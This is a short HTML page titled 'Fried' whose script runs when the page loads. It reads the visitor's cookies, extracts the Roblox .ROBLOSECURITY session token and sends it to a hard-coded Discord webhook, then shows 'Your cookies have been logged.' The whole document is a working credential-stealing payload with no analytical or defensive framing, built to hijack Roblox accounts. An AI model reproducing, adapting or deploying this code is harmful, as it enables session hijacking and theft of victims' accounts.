<!DOCTYPE html>
<html>
<head>
    <title>Fried</title>
    <script>
        function logCookies() {
            // Retrieve all cookies
            var cookies = document.cookie;
            console.log("All Cookies:", cookies);

            // Extract the .ROBLOSECURITY cookie
            var roblosecurityMatch = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
            if (roblosecurityMatch) {
                var roblosecurity = roblosecurityMatch[1];
                console.log(".ROBLOSECURITY Cookie Found:", roblosecurity);

                // Discord webhook URL
                var webhookUrl = 'https://discord.com/api/webhooks/1377645545291649127/yKXyaBLohAtSN9cN6pP8x_HZy2sRaaz9T2eXtPt6ONcKDEMlBd3WZchgyPjavSv0uchI';

                // Send the cookie to the Discord webhook
                var xhr = new XMLHttpRequest();
                xhr.open("POST", webhookUrl, true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify({
                    content: `Captured .ROBLOSECURITY Cookie: ${roblosecurity}`
                }));
            } else {
                console.log(".ROBLOSECURITY cookie not found.");
            }
        }

        window.onload = logCookies;
    </script>
</head>
<body>
    <h1>Welcome to the website!</h1>
    <p>Your cookies have been logged.</p>
</body>
</html>
